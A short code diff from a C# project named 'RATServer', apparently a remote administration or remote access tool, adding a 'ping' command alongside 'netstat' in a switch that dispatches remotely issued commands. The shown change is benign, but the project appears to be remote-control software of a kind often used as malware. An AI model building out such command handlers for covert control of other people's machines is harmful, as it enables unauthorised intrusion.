@@ -118,6 +118,9 @@ namespace RATServer
                         case "netstat":
                             r = Functions.NetStat();
                             break;
+                        case "ping":
+                            r = Functions.Ping(c.Args[0]);
+                            break;
                         default:
                             break;
                     }                 
